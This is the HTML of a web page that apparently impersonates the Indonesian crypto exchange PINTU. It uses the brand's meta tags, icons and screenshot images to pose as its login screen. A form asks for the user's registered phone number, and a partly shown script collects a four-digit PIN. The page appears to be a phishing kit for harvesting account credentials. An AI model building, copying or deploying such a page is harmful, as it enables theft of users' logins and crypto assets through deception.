<html>
    <head>
        ...
        <meta data-n-head="ssr" data-hid="description" name="description" property="description" content="PINTU merupakan platform jual beli Bitcoin dan aset kripto lain seperti BTC, Dogecoin, Ethereum, USDT dengan lebih dari 6,2 juta member di Indonesia.">
        <meta data-n-head="ssr" data-hid="og:url" name="og:url" property="og:url" content="https://PINTU.com">
        <meta name="og:image" property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSGCmmt6a9aftgzwNVCkD0zbX3pGvAeQS2yXTwccXZdmwyygDvnGoEWu0o&s=10">
        <meta data-n-head="ssr" data-hid="apple-mobile-web-app-title" name="apple-mobile-web-app-title" content="PINTU">
        <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSGCmmt6a9aftgzwNVCkD0zbX3pGvAeQS2yXTwccXZdmwyygDvnGoEWu0o&s=10">
        <meta data-n-head="ssr" data-hid="author" name="author" content="PINTU Team Development">
        <meta data-n-head="ssr" data-hid="theme-color" name="theme-color" content="#159DD0">
        <link data-n-head="ssr" data-hid="shortcut-icon" rel="shortcut icon" href="https://PINTU.com/v3-exchange/icons/icon_64x64.aa03b9.png">
        <link data-hid="apple-touch-icon" rel="apple-touch-icon" href="https://PINTU.com/v3-exchange/icons/icon_512x512.aa03b9.png" sizes="512x512">
    ...
    <body>
        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjkN9XBhR1R2HN9u57ZmJAumObWaJIJNgdLXKYNlFPYak7UizlY8P1AjaRxneAZHMGECrxgmyBsLH5e1LfN8CdL8SA9nPESfRiaPao2zB9wyBsemsb9mixmXQxwmE7BHT3BiX93DBRYPl8Gzs1B_Qc2L54PXfYdKE_6QZwCnUblI2wG2LfhpUI2W-6Zgdg/s1079/AddText_03-11-02.45.18.jpg" style="position absolute; width: 100%; top: 0; left: 0; right: 0;">
        <br/>
        <nav style="position: fixed; top: 70; left: 0; right: 0; width: 100%; height: 50px; background: #fff; padding: 10px; text-align: left; font-weight: 400; margin-left: 9px; font-size: 14.5px">Masukkan Nomor Handphone yang terdaftar di PINTU</nav>
        <!-- partial:index.partial.html -->
        <main>
            <section class="forms">
                <form id="formHP" class="form-login" method="POST">
                    <div class="input__wrapper">
                        <label class="label-form">Nomor Handphone</label>
                        <input id="user" name="nohp" class="input-form" type="tel" required placeholder="" minlength="10" maxlength="13"/>
                    </div>
                    <br/>
                    <p></p>
</div>
<section style="position fixed; width: 100%; bottom: 0; left: 0; right: 0; bortom: 0; margin-top: 255px">
    <button type="submit" class="btn-login button" id="doLog" disabled>Masuk Akun</button>
    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjtsDlQcTXC0_rz2TT0_xTu1D_p7a2eH4knvuwMx8OveuN4SAhCo-pcoCFAQsneRH7h2Nm-Vt35i9-ieqaaE2Bm6ewhgnN7d3p3TBaIPMxRhOaSp8I-yyrXht3E_LXoo8wqCxjhqBO0VW_a53VVv8yJOvSMCA_P1AmfPX6BazLS5dmpRwSoexNF0eztjbQ/s1080/IMG_20240311_013945.jpg" style="position relative; width: 100%; left: 0; right: 0;">
</section>
</form></section>
<center>
    ...
    $(document).ready(function() {
        $("input#setPin").on('click', function() {
            ...
            if ($.trim($("#pin1").html()) == '') {
                ...
                var setPin = $("#pin1").html() + '' + $("#pin2").html() + '' + $("#pin3").html() + '' + $("#pin4").html();
